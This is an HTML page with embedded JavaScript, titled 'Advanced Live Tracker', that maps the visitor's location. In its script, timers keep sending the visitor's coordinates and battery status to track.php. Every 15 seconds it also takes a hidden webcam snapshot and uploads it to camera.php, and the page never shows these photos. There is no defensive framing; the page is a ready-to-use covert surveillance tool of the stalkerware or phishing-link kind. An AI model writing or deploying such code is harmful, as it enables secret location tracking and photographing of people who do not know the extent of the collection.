<!-- map.html - Live GPS, Battery & Camera Tracking -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Live Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; }
        #map { height: 600px; width: 90%; margin: auto; border: 2px solid black; }
        .info-box { margin-top: 10px; padding: 10px; border: 1px solid black; display: inline-block; background: #f9f9f9; }
    </style>
</head>
<body>
    <h1>Advanced Live Tracker</h1>
    <div id="map"></div>
    <div class="info-box">
        <p><strong>Latitude:</strong> <span id="lat">N/A</span></p>
        <p><strong>Longitude:</strong> <span id="lon">N/A</span></p>
        <p><strong>Accuracy:</strong> <span id="accuracy">N/A</span> meters</p>
        <p><strong>Battery Level:</strong> <span id="battery">N/A</span></p>
        <p><strong>Charging:</strong> <span id="charging">N/A</span></p>
        <p><strong>Last Updated:</strong> <span id="timestamp">N/A</span></p>
    </div>
    
    <script>
        var map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);
        
        var marker, accuracyCircle;
        
        function updateLocation(lat, lon, accuracy) {
            if (!marker) {
                marker = L.marker([lat, lon]).addTo(map);
                accuracyCircle = L.circle([lat, lon], { radius: accuracy, color: 'blue', fillOpacity: 0.3 }).addTo(map);
            } else {
                marker.setLatLng([lat, lon]);
                accuracyCircle.setLatLng([lat, lon]).setRadius(accuracy);
            }
            map.setView([lat, lon], 15);
            
            document.getElementById("lat").innerText = lat;
            document.getElementById("lon").innerText = lon;
            document.getElementById("accuracy").innerText = accuracy;
            document.getElementById("timestamp").innerText = new Date().toLocaleTimeString();
        }
        
        function fetchLocation() {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    var accuracy = position.coords.accuracy;
                    updateLocation(lat, lon, accuracy);
                    fetch('track.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ lat: lat, lon: lon, accuracy: accuracy })
                    });
                },
                function(error) {
                    console.log("Location access denied.");
                }
            );
        }
        
        function fetchBatteryStatus() {
            navigator.getBattery().then(function(battery) {
                document.getElementById("battery").innerText = Math.round(battery.level * 100) + "%";
                document.getElementById("charging").innerText = battery.charging ? "Yes" : "No";
                
                fetch('track.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ battery: Math.round(battery.level * 100), charging: battery.charging })
                });
            });
        }
        
        function captureImage() {
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/png');
                    fetch('camera.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: 'image=' + encodeURIComponent(imageData)
                    });
                    stream.getTracks().forEach(track => track.stop());
                }, 5000);
            }).catch(error => console.log("Camera access denied."));
        }
        
        setInterval(fetchLocation, 5000);
        setInterval(fetchBatteryStatus, 10000);
        setInterval(captureImage, 15000);
    </script>
</body>
</html>
